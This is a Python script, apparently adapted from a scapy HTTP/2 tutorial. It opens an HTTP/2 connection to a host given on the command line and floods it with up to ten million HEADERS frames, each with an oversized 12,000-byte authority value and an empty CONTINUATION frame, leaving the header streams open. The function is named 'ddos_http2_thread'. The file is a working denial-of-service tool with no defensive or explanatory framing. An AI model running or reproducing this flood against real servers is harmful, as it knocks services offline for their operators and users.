# #!/usr/bin/env python
# # -*- coding: utf-8 -*-
# https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb

import sys
import scapy.contrib.http2 as h2
import scapy.supersocket as supersocket
from scapy.all import *

import logging
import threading
import time

DEBUG = False

def create_http2_socket(host, port):
    s=socket.socket()
    s.connect((host,port))
    ss=supersocket.StreamSocket(s, basecls=h2.H2Frame)
    srv_set = ss.recv()
    if DEBUG:
        srv_set.show()
    return ss

def create_windows_update_frame(size, stream_id):
    wu_frame = h2.H2Frame()/h2.H2WindowUpdateFrame(win_size_incr=size)

    if DEBUG:
        wu_frame.show()
    
    return wu_frame

def create_settings_frame():
    set_frame = h2.H2Frame()/h2.H2SettingsFrame()

    if DEBUG:
        set_frame.show()

    return set_frame

def create_headers_frame(flags, stream_id, method, path, authority, scheme, x=True):
    if flags:
        hdrs_frm = h2.H2Frame(flags=flags, stream_id=stream_id)/h2.H2HeadersFrame()
    else:
        hdrs_frm = h2.H2Frame(stream_id=stream_id)/h2.H2HeadersFrame()

    tblhdr = h2.HPackHdrTable()

    if x:
        get_hdr_idx = tblhdr.get_idx_by_name_and_value(':method', method)
        get_hdr = h2.HPackIndexedHdr(index = get_hdr_idx)
        if DEBUG:
            get_hdr.show()
        hdrs_frm.payload.hdrs.append(get_hdr)

        path_idx = tblhdr.get_idx_by_name_and_value(':path', path)
        path_hdr = h2.HPackIndexedHdr(index = path_idx)
        if DEBUG:
            path_hdr.show()
        hdrs_frm.payload.hdrs.append(path_hdr)

        host_hdr_idx = tblhdr.get_idx_by_name(':authority')
        path_str = h2.HPackHdrString(data = h2.HPackZString(authority))
        host_hdr = h2.HPackLitHdrFldWithoutIndexing(
            never_index=1, 
            index=host_hdr_idx,
            hdr_value=path_str
        )
        if DEBUG:
            host_hdr.show()
        hdrs_frm.payload.hdrs.append(host_hdr)

    if not x:
        https_hdr_idx = tblhdr.get_idx_by_name_and_value(':scheme', scheme)
        https_hdr = h2.HPackIndexedHdr(index = https_hdr_idx)
        if DEBUG:
            https_hdr.show()
        hdrs_frm.payload.hdrs.append(https_hdr)

    return hdrs_frm

def create_data_frame(flags, data, stream_id):
    if flags:
        data_pkg = h2.H2Frame(flags=flags,stream_id=stream_id)/h2.H2DataFrame(data=data)
    else:
        data_pkg = h2.H2Frame(stream_id=stream_id)/h2.H2DataFrame(data=data)

    if DEBUG:
        data_pkg.show()

    return data_pkg

def recv(ss):
    # Loop until an acknowledgement for our settings is received
    new_frame = None
    while isinstance(new_frame, type(None)) or not (
            new_frame.type == h2.H2SettingsFrame.type_id 
            and 'A' in new_frame.flags
        ):
        if not isinstance(new_frame, type(None)):
            # If we received a frame about window management
            # If we received a Ping frame, we acknowledge the ping, 
            # just by setting the ACK flag (A), and sending back the query
            if new_frame.type == h2.H2PingFrame.type_id:
                new_flags = new_frame.getfieldval('flags')
                new_flags.add('A')
                new_frame.flags = new_flags
                ss.send(new_frame)

        try:
            new_frame = ss.recv()
            if DEBUG:
                new_frame.show()
        except:
            import time
            time.sleep(1)
            new_frame = None


def ddos_http2_thread(index, dst, dstport):
    logging.info(f"[] Thread {index}: starting")
    ss = create_http2_socket(dst, dstport)

    own_set = h2.H2Frame()/h2.H2SettingsFrame()
    max_frm_sz = (1 << 24) - 1
    max_hdr_tbl_sz = (1 << 16) - 1
    win_sz = (1 << 31) - 1
    own_set.settings = [
        h2.H2Setting(id = h2.H2Setting.SETTINGS_ENABLE_PUSH, value=0),
        h2.H2Setting(id = h2.H2Setting.SETTINGS_INITIAL_WINDOW_SIZE, value=win_sz),
        h2.H2Setting(id = h2.H2Setting.SETTINGS_HEADER_TABLE_SIZE, value=max_hdr_tbl_sz),
        h2.H2Setting(id = h2.H2Setting.SETTINGS_MAX_FRAME_SIZE, value=max_frm_sz),
    ]

    h2seq = h2.H2Seq()
    h2seq.frames = [
        packet.Raw(h2.H2_CLIENT_CONNECTION_PREFACE),
        own_set
    ]
    ss.send(h2seq)
    logging.info('Send init')
    recv(ss)


    for i in range(0):
        logging.info(f'Sending {i} stream')
        hdrs_frame = create_headers_frame({"EH"}, i * 2 + 1, "POST", "/", "localhost:5928", "http")
        data_frame = create_data_frame(None, f"A" * 12000, i * 2 + 1)
        data_frame1 = create_data_frame(None, f"B" * 12000, i * 2 + 1)
        data_frame3 = create_data_frame({"ES"}, f"c" * 12000, i * 2 + 1)
        wu_frame = create_windows_update_frame(10000, i * 2 + 1)

        h2seq = h2.H2Seq()
        h2seq.frames = [
            hdrs_frame,
            data_frame3
        ]
        ss.send(h2seq)

    for i in range(10000000):
        logging.info(f'Sending open headers {i}')
        hdrs_frame2 = create_headers_frame(None, i * 2 + 1, "POST", "/", "X"*12000, "http")
        ss.send(hdrs_frame2)
        ss.send(h2.H2Frame(stream_id=i * 2 + 1)/h2.H2ContinuationFrame())
    
    logging.info('Now, he sleep :)')

    time.sleep(10000)


def main():
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    dst = sys.argv[1]
    dport = int(sys.argv[2])

    for _ in range(1):
        for i in range(1):
            logging.info(f"Running {i}")
            x = threading.Thread(target=ddos_http2_thread, args=(i, dst, dport,))
            x.start()
        
        time.sleep(1)

main()